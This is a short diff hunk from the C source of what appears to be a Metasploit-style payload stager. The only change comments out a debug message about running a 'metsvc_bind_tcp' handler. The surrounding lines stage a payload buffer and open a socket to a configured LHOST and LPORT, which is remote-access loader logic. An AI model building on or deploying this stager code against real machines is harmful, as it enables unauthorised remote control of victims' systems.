@@ -448,7 +448,7 @@ int wmain(int argc, wchar_t *argv[])
 			memcpy(TempBuffer + 5, buffer, StageSize);
 			buffer = TempBuffer;
 
-			dprintf(L"\n[*] Make sure you have \"windows/metsvc_bind_tcp\" handler running.\n\n");
+			//dprintf(L"\n[*] Make sure you have \"windows/metsvc_bind_tcp\" handler running.\n\n");
 			ConnectSocket = get_server_socket(payload_settings.LHOST,payload_settings.LPORT);
 			if (ConnectSocket == INVALID_SOCKET)
 			{
